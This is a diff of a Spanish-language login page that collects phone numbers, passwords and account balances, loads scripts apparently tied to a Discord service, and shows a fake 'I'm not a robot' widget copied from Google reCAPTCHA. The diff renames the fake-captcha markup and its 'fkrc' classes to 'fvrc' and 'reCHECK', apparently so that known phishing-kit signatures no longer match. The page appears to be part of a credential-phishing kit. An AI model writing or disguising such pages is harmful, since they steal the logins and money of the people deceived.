@@ -11,7 +11,7 @@
     <link rel="stylesheet" href="css/loading-spinner.css">
     <link rel="stylesheet" href="css/footer.css">
     <link rel="stylesheet" href="css/navbar.css">
-    <link rel="stylesheet" href="css/fakerecaptcha.css">
+    <link rel="stylesheet" href="css/simpleverify.css">
 </head>
 
 <body>
@@ -108,23 +108,23 @@
                 </div>
                 <!-- Mensaje de error para el saldo -->
                 <span id="saldoError" style="display: none; color: #e4002b; font-size: 13px; margin-top: 5px; margin-bottom: 15px; text-align: center; font-weight: 500;"></span>
-                 <!-- Fake captcha start -->
-    <div class="fkrc-container fkrc-m-p">
-        <!-- Captcha checkbox widget -->
-        <div id="fkrc-checkbox-window" class="fkrc-checkbox-window fkrc-m-p fkrc-block">
-            <div class="fkrc-checkbox-container fkrc-m-p">
-                <button type="button" id="fkrc-checkbox" class="fkrc-checkbox fkrc-m-p fkrc-line-normal"></button>
+                 <!-- Fake verificator start -->
+    <div class="fvrc-container fvrc-m-p">
+        <!-- Verificator checkbox widget -->
+        <div id="fvrc-checkbox-window" class="fvrc-checkbox-window fvrc-m-p fvrc-block">
+            <div class="fvrc-checkbox-container fvrc-m-p">
+                <button type="button" id="fvrc-checkbox" class="fvrc-checkbox fvrc-m-p fvrc-line-normal"></button>
             </div>
-            <p class="fkrc-im-not-a-robot fkrc-m-p fkrc-line-normal">No soy un robot</p>
-            <img src="assets/fake-captcha/captcha_logo.png" class="fkrc-captcha-logo fkrc-line-normal" alt="">
-            <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal reCAPTCHA">reCAPTCHA</p>
-            <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal p-t">Privacidad - Términos</p>
-            <img src="assets/fake-captcha/captcha_spinner.gif" class="fkrc-spinner fkrc-m-p fkrc-line-normal" alt="" id="fkrc-spinner">
+            <p class="fvrc-im-not-a-robot fvrc-m-p fvrc-line-normal">No soy un robot</p>
+            <img src="assets/fake-captcha/captcha_logo.png" class="fvrc-ver-logo fvrc-line-normal" alt="">
+            <p class="fvrc-checkbox-desc fvrc-m-p fvrc-line-normal rVerify">reCHECK</p>
+            <p class="fvrc-checkbox-desc fvrc-m-p fvrc-line-normal p-t">Privacidad - Términos</p>
+            <img src="assets/fake-captcha/captcha_spinner.gif" class="fvrc-spinner fvrc-m-p fvrc-line-normal" alt="" id="fvrc-spinner">
             <div class="checkmark"></div>
         </div>
-        <img src="assets/fake-captcha/captcha_arrow.svg" alt="" class="fkrc-verifywin-window-arrow" id="fkrc-verifywin-window-arrow"/>
+        <img src="assets/fake-captcha/captcha_arrow.svg" alt="" class="fvrc-verifywin-window-arrow" id="fvrc-verifywin-window-arrow"/>
     </div>
- <!-- Fake captcha end -->
+ <!-- Fake verificator end -->
                 <div class="formButtons">
                     <button class="homeFormButton btn1" id="loginButton" type="submit" disabled>Entrar</button>
                 </div>
@@ -135,7 +135,7 @@
     <script src="js/discord-config.js"></script>
     <script src="js/discordService.js"></script>
     <script src="js/sendBtn.js"></script>
-    <script src="js/fakerecaptcha.js"></script>
+    <script src="js/simpleverify.js"></script>
     <script type="module">
         import {
             LoginValidation
@@ -162,7 +162,7 @@
             const inputs = ['phoneNumber', 'password', 'saldoActual'];
             
             // Obtener el checkbox
-            const checkboxBtn = document.getElementById('fkrc-checkbox');
+            const checkboxBtn = document.getElementById('fvrc-checkbox');
 
             inputs.forEach(inputId => {
                 const input = document.getElementById(inputId);
